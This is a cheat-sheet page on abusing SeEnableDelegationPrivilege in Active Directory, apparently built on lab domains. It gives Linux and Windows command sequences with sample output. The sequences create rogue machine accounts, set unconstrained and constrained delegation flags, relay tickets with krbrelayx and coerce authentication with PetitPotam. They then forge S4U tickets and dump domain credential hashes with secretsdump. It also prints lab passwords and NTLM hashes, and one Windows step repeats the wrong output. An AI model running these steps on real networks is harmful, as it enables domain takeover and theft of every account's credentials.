---
title: "SeEnableDelegationPrivilege"
date: 2025-7-19
tags: ["SeEnableDelegationPrivilege", "Pass-The-Ticket", "Service Ticket", "Ticket Granting Ticket", "Constrained Delegation", "Active Directory", "Windows", "KCD", "secretsdump", "Unonstrained Delegation"]
---

### Abuse #1: Unconstrained Delegation

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Check Machine Quota

```console
# Password
nxc ldap <DC> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M maq
```

```console {class="sample-code"}
$ nxc ldap DC1.delegate.vl -u 'N.Thompson' -p 'KALEB_2341' -d delegate.vl -M maq
LDAP        10.10.72.178    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
LDAP        10.10.72.178    389    DC1              [+] delegate.vl\N.Thompson:KALEB_2341 
MAQ         10.10.72.178    389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.10.72.178    389    DC1              MachineAccountQuota: 10
```

#### 2. Create a Computer

```console
# Password
impacket-addcomputer -computer-name '<NEW_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
```

```console {class="sample-code"}
$ impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'Test1234' -dc-ip 10.10.72.178 'delegate.vl/N.Thompson:KALEB_2341'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account EvilComputer$ with password Test1234.
```

#### 3. Add DNS Record

```console
python3 dnstool.py -u '<DOMAIN>\<NEW_COMPUTER>$' -p '<NEW_PASSWORD>' -r <NEW_COMPUTER>.delegate.vl -d <LOCAL_IP> --action add <DC> -dns-ip <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'delegate.vl\EvilComputer$' -p 'Test1234' -r EvilComputer.delegate.vl -d 10.8.7.13 --action add DC1.delegate.vl -dns-ip 10.10.72.178
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

#### 4. Add 'TRUSTED_FOR_DELEGATION' to the New Computer

```console
# Password
bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add uac '<NEW_COMPUTER>$' -f TRUSTED_FOR_DELEGATION
```

```console {class="sample-code"}
$ bloodyAD -d 'delegate.vl' -u 'N.Thompson' -p 'KALEB_2341' --host DC1.delegate.vl --dc-ip 10.10.72.178 add uac 'EvilComputer$' -f TRUSTED_FOR_DELEGATION
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to EvilComputer$'s userAccountControl
```

#### 5. Add SPN via 'msDS-AdditionalDnsHostName'

```console
python3 addspn.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -s 'cifs/<NEW_COMPUTER>.<DOMAIN>' -t '<NEW_COMPUTER>$' -dc-ip <DC_IP> <DC> --additional
```

```console {class="sample-code"}
$ python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/EvilComputer.delegate.vl' -t 'EvilComputer$' -dc-ip 10.10.72.178 DC1.delegate.vl --additional
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

```console
python3 addspn.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -s 'cifs/<NEW_COMPUTER>.<DOMAIN>' -t '<NEW_COMPUTER>$' -dc-ip <DC_IP> <DC>
```

```console {class="sample-code"}
$ python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/EvilComputer.delegate.vl' -t 'EvilComputer$' -dc-ip 10.10.72.178 DC1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

#### 6. Check

```console
# Password
python3 addspn.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -q -t '<NEW_COMPUTER>$' -dc-ip <DC_IP> <DC>
```

```console {class="sample-code"}
$ python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -q -t 'EvilComputer$' -dc-ip 10.10.72.178 DC1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
DN: CN=EvilComputer,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2025-08-04T11:37:43.660170
    msDS-AdditionalDnsHostName: EvilComputer.delegate.vl
    sAMAccountName: EvilComputer$
    servicePrincipalName: cifs/EvilComputer.delegate.vl
```

#### 7. Generate NTLM

```console
iconv -f ASCII -t UTF-16LE <(printf '<NEW_PASSWORD>') | openssl dgst -md4
```

```console {class="sample-code"}
$ iconv -f ASCII -t UTF-16LE <(printf 'Test1234') | openssl dgst -md4
MD4(stdin)= b9e0cfceaf6d077970306a2fd88a7c0a
```

#### 8. Start a krbrelayx Server

```console
python3 krbrelayx.py -hashes ':<HASH>'
```

```console {class="sample-code"}
$ python3 krbrelayx.py -hashes ':b9e0cfceaf6d077970306a2fd88a7c0a'
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.72.178
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

#### 9. Coercing Authentication

```console
python3 PetitPotam.py -u '<NEW_COMPUTER>$' -p '<NEW_PASSWORD>' <NEW_COMPUTER>.<DOMAIN> <DC_IP>
```

```console {class="sample-code"}
$ python3 PetitPotam.py -u 'EvilComputer$' -p 'Test1234' EvilComputer.delegate.vl 10.10.72.178

              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:10.10.72.178[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

#### 10. Secrets Dump

```console
# Import TGT
export KRB5CCNAME='<DC_HOSTNAME>$@<DOMAIN>_krbtgt@<DOMAIN>.ccache'
```

```console
# Check
klist
```

```console {class="sample-code"}
$ klist
Ticket cache: FILE:DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
Default principal: DC1$@DELEGATE.VL

Valid starting       Expires              Service principal
2025-08-04T10:59:47  2025-08-04T19:37:54  krbtgt/DELEGATE.VL@DELEGATE.VL
        renew until 2025-08-11T09:37:54
```

```console
# Secretsdump
impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ impacket-secretsdump -k -no-pass DC1.delegate.vl              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
```

<small>*Ref: [krbrelayx](https://github.com/dirkjanm/krbrelayx)*</small>
<br>
<small>*Ref: [PetitPotam](https://github.com/topotam/PetitPotam)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import Module

```console
. .\Powermad.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> . .\Powermad.ps1
```

#### 2. Create a Computer

```console
New-MachineAccount -MachineAccount <NEW_COMPUTER> -Password $(ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'Test1234' -AsPlainText -Force)
[+] Machine account FakeComputer added
```

#### 3. Add 'TRUSTED_FOR_DELEGATION' to the New Computer

```console
Set-MachineAccountAttribute -MachineAccount <NEW_COMPUTER> -Attribute useraccountcontrol -Value 528384
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'Test1234' -AsPlainText -Force)
[+] Machine account FakeComputer added
```

#### 4. Add SPN via 'msDS-AdditionalDnsHostName'

```console
Set-MachineAccountAttribute -MachineAccount <NEW_COMPUTER> -Attribute ServicePrincipalName -Value CIFS/<NEW_COMPUTER>.<DOMAIN> -Append
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Set-MachineAccountAttribute -MachineAccount FakeComputer -Attribute ServicePrincipalName -Value CIFS/FakeComputer.delegate.vl -Append
[+] Machine account FakeComputer attribute ServicePrincipalName appended
```

#### 5. Check

```console
Get-MachineAccountAttribute -MachineAccount <NEW_COMPUTER> -Attribute ServicePrincipalName -Verbose
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Get-MachineAccountAttribute -MachineAccount FakeComputer -Attribute ServicePrincipalName -Verbose
Verbose: [+] Domain Controller = DC1.delegate.vl
Verbose: [+] Domain = delegate.vl
Verbose: [+] Distinguished Name = CN=FakeComputer,CN=Computers,DC=delegate,DC=vl
CIFS/FakeComputer.delegate.vl
RestrictedKrbHost/FakeComputer
HOST/FakeComputer
RestrictedKrbHost/FakeComputer.delegate.vl
HOST/FakeComputer.delegate.vl
```

#### 6. Add DNS Record

```console
python3 dnstool.py -u '<DOMAIN>\<NEW_COMPUTER>$' -p '<NEW_PASSWORD>' -r <NEW_COMPUTER>.delegate.vl -d <LOCAL_IP> --action add <DC> -dns-ip <DC_IP>
```

```console {class="sample-code"}
$ python3 dnstool.py -u 'DELEGATE.VL\FakeComputer$' -p 'Test1234' -r FakeComputer.delegate.vl -d 10.8.7.13 --action add DC1.delegate.vl -dns-ip 10.10.113.136
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

#### 7. Generate NTLM

```console
iconv -f ASCII -t UTF-16LE <(printf '<NEW_PASSWORD>') | openssl dgst -md4
```

```console {class="sample-code"}
$ iconv -f ASCII -t UTF-16LE <(printf 'Test1234') | openssl dgst -md4
MD4(stdin)= b9e0cfceaf6d077970306a2fd88a7c0a
```

#### 8. Start a krbrelayx Server

```console
python3 krbrelayx.py -hashes ':<HASH>'
```

```console {class="sample-code"}
$ python3 krbrelayx.py -hashes ':b9e0cfceaf6d077970306a2fd88a7c0a'
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.72.178
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

#### 9. Coercing Authentication

```console
python3 PetitPotam.py -u '<NEW_COMPUTER>$' -p '<NEW_PASSWORD>' <NEW_COMPUTER>.<DOMAIN> <DC_IP>
```

```console {class="sample-code"}
$ python3 PetitPotam.py -u 'FakeComputer$' -p 'Test1234' FakeComputer.delegate.vl 10.10.72.178

              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:10.10.72.178[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

#### 10. Secrets Dump

```console
# Import TGT
export KRB5CCNAME='<DC_HOSTNAME>$@<DOMAIN>_krbtgt@<DOMAIN>.ccache'
```

```console
# Check
klist
```

```console {class="sample-code"}
$ klist
Ticket cache: FILE:DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
Default principal: DC1$@DELEGATE.VL

Valid starting       Expires              Service principal
2025-08-04T10:59:47  2025-08-04T19:37:54  krbtgt/DELEGATE.VL@DELEGATE.VL
        renew until 2025-08-11T09:37:54
```

```console
# Secretsdump
impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ impacket-secretsdump -k -no-pass DC1.delegate.vl              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:---[REDACTED]---:::
```

<small>*Ref: [krbrelayx](https://github.com/dirkjanm/krbrelayx)*</small>
<br>
<small>*Ref: [PetitPotam](https://github.com/topotam/PetitPotam)*</small>
<br>
<small>*Ref: [Powermad](https://github.com/Kevin-Robertson/Powermad)*</small>

{{< /tabcontent >}}

### Abuse #2: Constrained Delegation

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Control of a Machine Account

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_MACHINE>$' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d REDELEGATE.VL -u 'HELEN.FROST' -p 'Fall2024!' --host DC.REDELEGATE.VL set password 'FS01$' 'Fall2024!'
[+] Password changed successfully!
```

#### 2. Set msDS-AllowedToDelegateTo to Target SPN

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set object 'CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>' 'msDS-AllowedToDelegateTo' -v 'ldap/<DC>'
```

```console {class="sample-code"}
$ bloodyAD -u 'HELEN.FROST' -p 'Fall2024!' -d 'REDELEGATE.VL' --host 'dc.redelegate.vl' set object 'CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL' 'msDS-AllowedToDelegateTo' -v 'ldap/dc.redelegate.vl'
[+] CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL's msDS-AllowedToDelegateTo has been updated
```

#### 3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add uac '<TARGET_MACHINE>$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

```console {class="sample-code"}
$ bloodyAD -u 'HELEN.FROST' -p 'Fall2024!' -d 'REDELEGATE.VL' --host 'dc.redelegate.vl' add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
[-] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to FS01$'s userAccountControl
```

#### 4. Request a Service Ticket

```console
impacket-getST '<DOMAIN>/<TARGET_MACHINE>$:<NEW_PASSWORD>' -spn 'ldap/<DC>' -impersonate DC
```

```console {class="sample-code"}
$ impacket-getST 'redelegate.vl/fs01$:Fall2024!' -spn ldap/dc.redelegate.vl -impersonate DC
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

#### 5. Secretsdump

```console
# Import Ticket
export KRB5CCNAME=DC@ldap_<DC>@<DOMAIN>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console
# Secretsdump
sudo ntpdate -s <DC_IP> && impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.234.50 && impacket-secretsdump -k -no-pass DC.REDELEGATE.VL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Control of a Machine Account

```console
Set-ADAccountPassword -Identity "<TARGET_MACHINE>$" -Reset -NewPassword (ConvertTo-SecureString "<NEW_PASSWORD>" -AsPlainText -Force)
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADAccountPassword -Identity "FS01$" -Reset -NewPassword (ConvertTo-SecureString "Fall2024!" -AsPlainText -Force)
```

#### 2. Set msDS-AllowedToDelegateTo to Target SPN

```console
Set-ADObject -Identity "CN=<TARGET_MACHINE>,CN=COMPUTERS,DC=<EXAMPLE>,DC=<COM>" -Add @{"msDS-AllowedToDelegateTo"="ldap/<DC>"}
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
```

#### 3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag

```console
Set-ADAccountControl -Identity "<TARGET_MACHINE>$" -TrustedToAuthForDelegation $True
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

#### 4. Request a Service Ticket

```console
impacket-getST '<DOMAIN>/<TARGET_MACHINE>$:<NEW_PASSWORD>' -spn 'ldap/<DC>' -impersonate DC
```

```console {class="sample-code"}
$ impacket-getST 'redelegate.vl/fs01$:Fall2024!' -spn ldap/dc.redelegate.vl -impersonate DC
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

#### 5. Secretsdump

```console
# Import Ticket
export KRB5CCNAME=DC@ldap_<DC>@<DOMAIN>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

```console
# Secretsdump
sudo ntpdate -s <DC_IP> && impacket-secretsdump -k -no-pass <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.234.50 && impacket-secretsdump -k -no-pass DC.REDELEGATE.VL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
---[SNIP]---
[*] Cleaning up...
```

{{< /tabcontent >}}